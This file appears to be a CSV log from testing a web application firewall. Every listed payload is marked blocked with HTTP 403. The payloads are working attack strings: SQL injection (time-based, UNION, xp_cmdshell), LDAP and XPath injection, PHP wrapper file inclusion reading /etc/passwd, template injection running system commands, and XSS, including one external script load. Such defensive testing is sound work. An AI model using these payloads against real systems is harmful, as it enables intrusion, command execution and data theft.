Status,Payload,HTTP Status,Content Length
Blocked,*(|(mail=*)),403,3662
Blocked,*(|(objectclass=*)),403,3662
Blocked,x' or name()='username' or 'x'='y,403,3662
Blocked,*)(uid=*))(|(uid=*,403,3662
Blocked,php://filter/convert.base64-encode/resource=index,403,3662
Blocked,php://filter/convert.base64-encode/resource=index.php,403,3662
Blocked,php://filter/convert.base64-encode/resource=index.php%00,403,3662
Blocked,php://filter/convert.base64-encode/resource=./index,403,3662
Blocked,php://filter/convert.base64-encode/resource=../index.php,403,3662
Blocked,php://filter/convert.base64-encode/resource=...//index.php,403,3662
Blocked,php://filter/convert.base64-encode/resource=....//index.php,403,3662
Blocked,php://filter/convert.base64-encode/resource=../index.php%00,403,3662
Blocked,php://filter/convert.base64-encode/resource=...//index.php%00,403,3662
Blocked,php://filter/convert.base64-encode/resource=....//index.php%00,403,3662
Blocked,php://filter/convert.base64-encode/resource=/etc/passwd,403,3662
Blocked,php://filter/convert.base64-encode/resource=/etc/passwd%00,403,3662
Blocked,php%3A%2F%2Ffilter%2Fconvert%2Ebase64%2Dencode%2Fresource%3Dindex,403,3662
Blocked,php%3A%2F%2Ffilter%2Fconvert%2Ebase64%2Dencode%2Fresource%3Dindex%2Ephp,403,3662
Blocked,php%3A%2F%2Ffilter%2Fconvert%2Ebase64%2Dencode%2Fresource%3Dindex%2Ephp%00,403,3662
Blocked,php%3A%2F%2Ffilter%2Fconvert%2Ebase64%2Dencode%2Fresource%3D%2Fetc%2Fpasswd,403,3662
Blocked,php%3A%2F%2Ffilter%2Fconvert%2Ebase64%2Dencode%2Fresource%3D%2Fetc%2Fpasswd%00,403,3662
Blocked,php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dindex,403,3662
Blocked,php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dindex%252Ephp,403,3662
Blocked,php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dindex%252Ephp%00,403,3662
Blocked,php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253D%252Fetc%252Fpasswd,403,3662
Blocked,php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253D%252Fetc%252Fpasswd%00,403,3662
Blocked,expect://ls,403,3662
Blocked,expect%3A%2F%2Fls,403,3662
Blocked,expect%253A%252F%252Fls,403,3662
Blocked,expect://ls%00,403,3662
Blocked,expect%3A%2F%2Fls%00,403,3662
Blocked,expect%253A%252F%252Fls%00,403,3662
Blocked,php://input,403,3662
Blocked,php%3A%2F%2Finput,403,3662
Blocked,php%253A%252F%252Finput,403,3662
Blocked,php://input%00,403,3662
Blocked,php%3A%2F%2Finput%00,403,3662
Blocked,php%253A%252F%252Finput%00,403,3662
Blocked,"db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",403,3662
Blocked,';sleep(5000);,403,3662
Blocked,)%20or%20('x'='x,403,3662
Blocked,"benchmark(10000000,MD5(1))#",403,3662
Blocked,""";waitfor delay '0:0:__TIME__'--",403,3662
Blocked,1) or pg_sleep(__TIME__)--,403,3662
Blocked,"||(elt(-3+5,bin(15),ord(10),hex(char(45))))",403,3662
Blocked,"""hi"""") or (""""a""""=""""a""",403,3662
Blocked,""" or sleep(__TIME__)#",403,3662
Blocked,pg_sleep(__TIME__)--,403,3662
Blocked,*(|(objectclass=*)),403,3662
Blocked,1) or sleep(__TIME__)#,403,3662
Blocked,) or ('a'='a,403,3662
Blocked,"1)) or benchmark(10000000,MD5(1))#",403,3662
Blocked,"""a"""" or 3=3--""",403,3662
Blocked,""" or benchmark(10000000,MD5(1))#",403,3662
Blocked,1 waitfor delay '0:0:10'--,403,3662
Blocked,"hi or 1=1 --""",403,3662
Blocked,) or sleep(__TIME__)=',403,3662
Blocked,")) or benchmark(10000000,MD5(1))#",403,3662
Blocked,hi' or 'a'='a,403,3662
Blocked,""")) or benchmark(10000000,MD5(1))#",403,3662
Blocked,hi') or ('a'='a,403,3662
Blocked,));waitfor delay '0:0:__TIME__'--,403,3662
Blocked,a' waitfor delay '0:0:10'--,403,3662
Blocked,"1;(load_file(char(47,101,116,99,47,112,97,115, ...",403,3662
Blocked,1 or sleep(__TIME__)#,403,3662
Blocked, and 1 in (select var from temp)--,403,3662
Blocked,; exec master..xp_cmdshell 'ping 172.10.1.255'--,403,3662
Blocked,""" or pg_sleep(__TIME__)--",403,3662
Blocked,x' AND email IS NULL; --,403,3662
Blocked,"1) or benchmark(10000000,MD5(1))#",403,3662
Blocked,\x27UNION SELECT,403,3662
Blocked,"""));waitfor delay '0:0:__TIME__'--",403,3662
Blocked,%2A%28%7C%28objectclass%3D%2A%29%29,403,3662
Blocked,) union select * from information_schema.tables;,403,3662
Blocked,PRINT @@variable,403,3662
Blocked,or isNULL(1/0) /*,403,3662
Blocked,""" or ""a""=""a",403,3662
Blocked,x' AND members.email IS NULL; --,403,3662
Blocked," and 1=( if((load_file(char(110,46,101,120,11 ...",403,3662
Blocked,1)) or pg_sleep(__TIME__)--,403,3662
Blocked, union all select @@version--,403,3662
Blocked,t'exec master..xp_cmdshell 'nslookup www.googl ...,403,3662
Blocked,"1 or benchmark(10000000,MD5(1))#",403,3662
Blocked,||UTL_HTTP.REQUEST,403,3662
Blocked, or pg_sleep(__TIME__)--,403,3662
Blocked,hi' or 'x'='x';,403,3662
Blocked,""") or sleep(__TIME__)=""",403,3662
Blocked, or 'whatever' in ('whatever'),403,3662
Blocked," union select 1,load_file('/etc/passwd'),1,1,1;",403,3662
Blocked,) or pg_sleep(__TIME__)--,403,3662
Blocked, or sleep(__TIME__)#,403,3662
Blocked, select * from information_schema.tables--,403,3662
Blocked,a' or 1=1--,403,3662
Blocked,a' or 'a' = 'a,403,3662
Blocked, or sleep(__TIME__)=',403,3662
Blocked,""" or isNULL(1/0) /*",403,3662
Blocked,â or 1=1 --,403,3662
Blocked, having 1=1--,403,3662
Blocked,") or benchmark(10000000,MD5(1))#",403,3662
Blocked,;waitfor delay '0:0:__TIME__'--,403,3662
Blocked,""" or 1=1--",403,3662
Blocked,x' AND userid IS NULL; --,403,3662
Blocked," or benchmark(10000000,MD5(1))#",403,3662
Blocked,""");waitfor delay '0:0:__TIME__'--",403,3662
Blocked,a' or 3=3--,403,3662
Blocked, group by userid having 1=1--,403,3662
Blocked,; exec master..xp_cmdshell,403,3662
Blocked,""")) or sleep(__TIME__)=""",403,3662
Blocked,hi' or 1=1 --,403,3662
Blocked,""") or pg_sleep(__TIME__)--",403,3662
Blocked,Ã½ or 1=1 --,403,3662
Blocked,1 or pg_sleep(__TIME__)--,403,3662
Blocked,0 or 1=1,403,3662
Blocked,%27%20or%201=1,403,3662
Blocked,)) or pg_sleep(__TIME__)--,403,3662
Blocked,x' AND 1=(SELECT COUNT(*) FROM tabname); --,403,3662
Blocked,; or '1'='1',403,3662
Blocked,1 or 1=1,403,3662
Blocked,23 OR 1=1,403,3662
Blocked,anything' OR 'x'='x,403,3662
Blocked,1)) or sleep(__TIME__)#,403,3662
Blocked,*(|(mail=*)),403,3662
Blocked,);waitfor delay '0:0:__TIME__'--,403,3662
Blocked,""") or benchmark(10000000,MD5(1))#",403,3662
Blocked,)) or sleep(__TIME__)=',403,3662
Blocked, or 1 in (select @@version)--,403,3662
Blocked, union select * from users where login = char ...,403,3662
Blocked,x' or 1=1 or 'x'='y,403,3662
Blocked,â or 3=3 --,403,3662
Blocked,"""a"""" or 1=1--""",403,3662
Blocked,""" or 0=0 --",403,3662
Blocked,""")) or pg_sleep(__TIME__)--",403,3662
Blocked,' or 1=1,403,3662
Blocked,x' OR full_name LIKE '%Bob%,403,3662
Blocked,'; exec master..xp_cmdshell 'ping 172.10.1.255'--,403,3662
Blocked,'%20or%20''=',403,3662
Blocked,'%20or%20'x'='x,403,3662
Blocked,')%20or%20('x'='x,403,3662
Blocked,' or 0=0 --,403,3662
Blocked,' or 0=0 #,403,3662
Blocked,' or 1=1--,403,3662
Blocked,' or '1'='1'--,403,3662
Blocked,' or 1 --',403,3662
Blocked,' or 1=1 or ''=',403,3662
Blocked,' or a=a--,403,3662
Blocked,') or ('a'='a,403,3662
Blocked,'hi' or 'x'='x';,403,3662
Blocked,' or username like '%,403,3662
Blocked,' or uname like '%,403,3662
Blocked,' or userid like '%,403,3662
Blocked,' or uid like '%,403,3662
Blocked,' or user like '%,403,3662
Blocked,'; exec master..xp_cmdshell,403,3662
Blocked,'; exec xp_regread,403,3662
Blocked,t'exec master..xp_cmdshell 'nslookup www.google.com'--,403,3662
Blocked,#NAME?,403,3662
Blocked,' UNION SELECT,403,3662
Blocked,' UNION ALL SELECT,403,3662
Blocked,'||UTL_HTTP.REQUEST,403,3662
Blocked,1;SELECT%20*,403,3662
Blocked,'%20or%201=1,403,3662
Blocked,' or ''=',403,3662
Blocked,' or 3=3,403,3662
Blocked,sleep(__TIME__)#,403,3662
Blocked,1 or sleep(__TIME__)#,403,3662
Blocked,""" or sleep(__TIME__)#",403,3662
Blocked,' or sleep(__TIME__)#,403,3662
Blocked,""" or sleep(__TIME__)=""",403,3662
Blocked,' or sleep(__TIME__)=',403,3662
Blocked,1) or sleep(__TIME__)#,403,3662
Blocked,""") or sleep(__TIME__)=""",403,3662
Blocked,') or sleep(__TIME__)=',403,3662
Blocked,1)) or sleep(__TIME__)#,403,3662
Blocked,""")) or sleep(__TIME__)=""",403,3662
Blocked,')) or sleep(__TIME__)=',403,3662
Blocked,;waitfor delay '0:0:__TIME__'--,403,3662
Blocked,);waitfor delay '0:0:__TIME__'--,403,3662
Blocked,';waitfor delay '0:0:__TIME__'--,403,3662
Blocked,""";waitfor delay '0:0:__TIME__'--",403,3662
Blocked,');waitfor delay '0:0:__TIME__'--,403,3662
Blocked,""");waitfor delay '0:0:__TIME__'--",403,3662
Blocked,));waitfor delay '0:0:__TIME__'--,403,3662
Blocked,'));waitfor delay '0:0:__TIME__'--,403,3662
Blocked,"""));waitfor delay '0:0:__TIME__'--",403,3662
Blocked,"benchmark(10000000,MD5(1))#",403,3662
Blocked,"1 or benchmark(10000000,MD5(1))#",403,3662
Blocked,""" or benchmark(10000000,MD5(1))#",403,3662
Blocked,"' or benchmark(10000000,MD5(1))#",403,3662
Blocked,"1) or benchmark(10000000,MD5(1))#",403,3662
Blocked,""") or benchmark(10000000,MD5(1))#",403,3662
Blocked,"') or benchmark(10000000,MD5(1))#",403,3662
Blocked,"1)) or benchmark(10000000,MD5(1))#",403,3662
Blocked,""")) or benchmark(10000000,MD5(1))#",403,3662
Blocked,"')) or benchmark(10000000,MD5(1))#",403,3662
Blocked,pg_sleep(__TIME__)--,403,3662
Blocked,1 or pg_sleep(__TIME__)--,403,3662
Blocked,""" or pg_sleep(__TIME__)--",403,3662
Blocked,' or pg_sleep(__TIME__)--,403,3662
Blocked,1) or pg_sleep(__TIME__)--,403,3662
Blocked,""") or pg_sleep(__TIME__)--",403,3662
Blocked,') or pg_sleep(__TIME__)--,403,3662
Blocked,1)) or pg_sleep(__TIME__)--,403,3662
Blocked,""")) or pg_sleep(__TIME__)--",403,3662
Blocked,')) or pg_sleep(__TIME__)--,403,3662
Blocked,' or '1' = '1,403,3662
Blocked,group_concat(table_name),403,3662
Blocked,concat/*!(table_name)*/,403,3662
Blocked,"' || (select sql from sqlite_master) || '<pre><!--#exec cmd=""ls"" --></pre>",403,3662
Blocked,{{'a'.toUpperCase()}} ,403,3662
Blocked,"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",403,3662
Blocked,"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",403,3662
Blocked,"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",403,3662
Blocked,"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""uname\\\"",\\\""-a\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",403,3662
Blocked,${T(java.lang.System).getenv()},403,3662
Blocked,${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},403,3662
Blocked,"${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}${self.module.cache.util.os.system(""id"")}",403,3662
Blocked,"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",403,3662
Blocked,"0\""autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)-""",403,3662
Blocked,"<script/src=data:,alert()>",403,3662
Blocked,<marquee/onstart=alert()>,403,3662
Blocked,<video/poster/onerror=alert()>,403,3662
Blocked,<isindex/autofocus/onfocus=alert()>,403,3662
Blocked,<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,403,3662
Blocked,"<IMG SRC=""javascript:alert('XSS');"">",403,3662
Blocked,<IMG SRC=javascript:alert('XSS')>,403,3662
Blocked,<IMG SRC=JaVaScRiPt:alert('XSS')>,403,3662
Blocked,"<IMG SRC=javascript:alert(""XSS"")>",403,3662
Blocked,"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>",403,3662
Blocked,"<a onmouseover=""alert(document.cookie)"">xxs link</a>",403,3662
Blocked,<a onmouseover=alert(document.cookie)>xxs link</a>,403,3662
Blocked,"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",403,3662
Blocked,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",403,3662
Blocked,"<IMG SRC= onmouseover=""alert('xxs')"">",403,3662
Blocked,"<IMG onmouseover=""alert('xxs')"">",403,3662
